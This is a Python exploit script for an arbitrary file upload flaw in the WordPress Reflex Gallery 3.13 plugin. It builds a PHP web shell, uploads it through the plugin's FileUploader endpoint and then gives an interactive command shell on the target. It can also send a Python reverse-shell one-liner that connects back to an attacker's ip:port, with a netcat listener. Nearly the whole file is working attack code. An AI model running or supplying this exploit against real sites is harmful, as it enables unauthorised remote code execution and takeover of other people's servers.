# Libraries
import requests
import sys
import argparse
import os
import re
from time import sleep
from base64 import b64encode

# Colors
class c:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'


def banniere():
    banniere = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠛⠉⠀⠀⠀⠀⠉⠙⠶⠦⣀⡀⠀⠀⠀⣀⣠⠴⠶⠞⠛⠛⠶⠤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⣞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠞⠁⠀⠀⠀⠀⠀⣀⣠⡤⠤⠤⠤⣤⣄⡀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⢠⠶⠛⠉⠁⠀⠀⠀⠀⠀⠈⠙⠓⠦⢤⣿⠤⠖⠒⠒⠒⠒⠒⠚⠒⠓⠲⠾⢧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⡤⠤⠤⠤⠤⣭⣳⣤⡀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣬⣙⣳⣦⣄⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣷⣦⣤⣄⣀⡀⠀⣀⣀⣤⣤⣤⣶⣯⣭⣥⣶⣶⣯⣭⣽⣶⣶⣬⣭⣙⣴⢖⣫⣭⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⣿⣷⣤
⠀⠀⠀⣤⠛⢹⡇⠈⠉⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡿⣿⣿⣿⣿
⠀⢀⡞⠁⠀⠸⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿
⢀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⣀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⣉⣩⡭⠿⠛⠉⠁⠀⠀⠀⠀⠀⠙⠛⢿⡒⠛⠛⠛⠋⠻⡭⡉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠛⠉⠉⠉⠳⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢀⣀⠀⠀⠀⠉⠙⠳⠦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣇⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡄⠀⠈⠉⠛⠢⢤⣤⣀⠀⠀⠈⠉⠉⠑⠒⠒⠒⠢⠤⢤⣤⣤⣤⣤⣄⣠⣤⣤⡤⠔⠚⠋⠁⢀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢦⣄⡀⠀⠀⠀⠈⠉⠙⠓⠒⠦⢦⣤⣤⣄⣀⣀⣀⣀⣀⣀⠀⠀⠈⠁⠀⢀⣀⣀⣠⣤⠖⠉⠀⠀
⠛⣻⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠲⢤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠉⠀⠉⠉⠉⠉⠉⣉⣉⣤⣥⣷⠾⠓⢲⣚⡟
⠈⣞⣷⣴⣌⣽⣫⣿⠷⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⠷⠶⠶⠶⠶⢶⢦⣤⣤⣴⢿⣯⡉⠉⣁⣞⠗⢂⠹⡝⠅
⠀⣻⣿⣷⢪⣿⣋⠀⠀⢀⡈⣽⡛⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⣛⣍⣿⢷⡆⣈⣻⣮⠀⣻⣧⢿⣷⣶⠾
⠿⣿⣿⠾⠿⣿⡿⣵⣿⡏⣿⠹⣿⣞⢷⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣴⠟⡾⣿⣹⣿⣿⢷⡽⣏⠛⠓⠒⠛⠛⠛⠛⠛
⡼⢭⠥⣴⠬⣿⠿⢯⡿⢥⡿⢧⡿⢿⡿⢯⠭⢭⡿⢿⡿⢿⡿⢶⡶⢶⡾⢾⡿⢿⡭⢿⣿⠼⣧⠍⣭⠭⣥⠬⣷⢻⣆⣀⣦⣀⣴⣀⣀⠀
⢱⡿⠶⠿⠶⠾⠶⠾⠶⠾⠷⠾⠶⠾⠷⠾⠶⠾⠷⠾⠷⠾⠷⠾⠷⠾⠟⠛⠻⠞⠛⠛⠛⠛⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⢹⡀"""

    print("\033[92m")
    for line in banniere.split():
        print(line)
        sleep(0.05)
    
    print("\033[0m")



# Add arguments
def parser():

    p = argparse.ArgumentParser(description="Reflex Gallery 3.13 Exploit - Arbitrary File Upload to RCE")
    p.add_argument("-u", "--url", required=False, help="base URL of the wordpress target")
    p.add_argument("-i", "--info", required=False, action='store_true', help="show vulnerability description")
    p.add_argument("-y", "--year", required=False, help="Actual year, example : 2023")
    p.add_argument("-m", "--month", required=False, help="Actual month, exemple : 10")
    p.add_argument("-r", "--revshell", required=False, help="Reverse shell with ip:port, use nc -lvnp to listen on port")

    return p.parse_args()

# Execute commands once webshell is uploaded
def execute_commands(url, webshell_name, year, month):

    whoami = requests.get(f"{url}wp-content/uploads/{year}/{month}/{webshell_name}?cmd=whoami").text
    whoami = whoami.strip()
    
    hostname = requests.get(f"{url}wp-content/uploads/{year}/{month}/{webshell_name}?cmd=hostname -I").text
    hostname = hostname.strip()

    print(c.BLUE + "\nType " + c.YELLOW + "help" + c.BLUE + " to see extra functions\n" + c.END)
    while True:
        
        command_to_exec = input(whoami + "@" + hostname + ":~$ ")
        
        if command_to_exec != "exit" and command_to_exec != "quit" and command_to_exec != "help" and command_to_exec != "clear" and command_to_exec != "cls" and command_to_exec != "?":
            command_out = requests.get(f"{url}wp-content/uploads/{year}/{month}/{webshell_name}?cmd={command_to_exec}").text
            print("\n" + command_out)

        if command_to_exec == "help" or command_to_exec == "?":
            print(c.YELLOW + "\nCommands\t\tDescription" + c.END)
            print(c.YELLOW + "--------\t\t-----------" + c.END)
            print(c.BLUE + "quit/exit\t\tExit from shell" + c.END)
            print(c.BLUE + "clear/cls\t\tClear terminal output" + c.END)
            print(c.BLUE + "help/?\t\t\tPrint this help panel\n" + c.END)

        if command_to_exec == "clear" or command_to_exec == "cls":
            os.system("clear")

        if command_to_exec == "exit" or command_to_exec == "quit":

            print(c.BLUE + "\n[" + c.YELLOW + "*" + c.BLUE + "] Clossing connection, bye!" + c.END)
            sys.exit(0)        

# Main function
def main():
    
    banniere()

    # Parse arguments
    args = parser()

    try:
        if not sys.argv[1]:
            print("URL not provided, [-h/--help] to show help panel")
            sys.exit(0)
    except:
        print("URL not provided, [-h/--help] to show help panel")
        sys.exit(0)

    if args.info:
        exp_info = """\n# Exploit Title: Wordpress Plugin Reflex Gallery - Arbitrary File Upload
# Discovered by: CrashBandicot @DosPerl
# Vendor Homepage: https://wordpress.org/plugins/reflex-gallery/
# Software Link: https://downloads.wordpress.org/plugin/reflex-gallery.zip"""
        print(exp_info)
        
        print("\nPath where the vuln occurs: /wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php")

        print("\nVulnerable code:")
        print("50.      if(!move_uploaded_file($_FILES['qqfile']['tmp_name'], $path)){")
        print("173.         $result = $uploader->handleUpload('../../../../../uploads/'.$_GET['Year'].'/'.$_GET['Month'].'/');")
        print(f"\n{c.YELLOW}--------------------------------------------------------------------------------{c.END}\n")
        print("Parameters: ")
        print("\t-u or --url")
        print("\t\tThe url of the target")
        print("\t\tExample : http://192.168.58.1/this_is_wordpress/")
        print("\t-y or --year")
        print("\t\tThe current year")
        print("\t\tExample : 2023")
        print("\t-m or --month")
        print("\t\tThe current month")
        print("\t\tExample : 01 for january")
        print("\t[optonal] -r or --revshell")
        print("\t\tip:port if you want a reverse shell (and not a webshell)")
        print("\t\tExample : 192.168.58.2:4444")
        sys.exit(0)

    arguments_ok = True
    if args.url is None:
        print(f"{c.RED}You need to provide argument -u or --url, use -i to have more infos{c.END}")
        arguments_ok = False
    if args.year is None or args.month is None:
        print(f"{c.RED}You need to specify the year and the month with -y and -m, use -i to have more infos{c.END}")
        arguments_ok = False
    
    if not arguments_ok:
        print("Exiting because all required argumuments wasn't given")
        sys.exit(0)
    
    url = args.url

    # Check if target is live
    sleep(0.2)
    print(c.BLUE + "[" + c.YELLOW + "*" + c.BLUE + "] Checking connection with target..." + c.END)
    checker = requests.get(url, timeout=10)
    sleep(0.4)

    if checker.status_code != 404 and checker.status_code != 500:
        print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + "] Connection established successfully" + c.END)
    else:
        print(c.BLUE + "[" + c.RED + "-" + c.BLUE + "] Connection refused, exiting" + c.END)
        sys.exit(0)

    try:
        os.remove("exploit-shell.php")
    except:
        pass

    # Create webshell file
    shell = open("exploit-shell.php", "w")
    shell.write("<?php system($_REQUEST['cmd']); ?>")
    shell.close()

    # Define file content
    file = {"qqfile": open("exploit-shell.php", "r")}

    if not url.endswith("/"):
        url = url + "/"

    # Upload file
    sleep(0.3)
    print(c.BLUE + "[" + c.YELLOW + "*" + c.BLUE + "] Uploading malicious file..." + c.END)
    r = requests.post(f"{url}wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year={args.year}&Month={args.month}", files=file)
    print(r.text)
    uploaded_name = re.findall(r'"fileName":"(.*?)"', r.text)[0].split("/")[-1]
    sleep(0.6)

    if uploaded_name != "" and "true" in r.text:
        print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + "] File uploaded successfully" + c.END)
        sleep(0.3)

    try:
        os.remove("exploit-shell.php")
    except:
        pass

    # "while" loop to execute commands in a fake-shell
    print(c.BLUE + "[" + c.YELLOW + "*" + c.BLUE + "] Trying to establish a shell..." + c.END)
    sleep(0.4)
    if args.revshell is None:
        execute_commands(url, uploaded_name, args.year, args.month)
    else:
        ip, port = args.revshell.split(":")
        print(f"Sending revser shell bind to ip : {ip} and port : {port}")
        print(f"To bind easily, use nc -lvnp {port}")
        reverse = f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'"""
        try:
            requests.get(f"{url}wp-content/uploads/{args.year}/{args.month}/{uploaded_name}?cmd={reverse}", timeout=3)
        except:
            print("Revseshell sent in python3, check your netcat listener")
            

if __name__ == "__main__":

    # Program starts here
    try:
        main()
    except KeyboardInterrupt:
        print(c.BLUE + "\n\nInterrupt handler received, exiting..." + c.END)
        sys.exit(0)

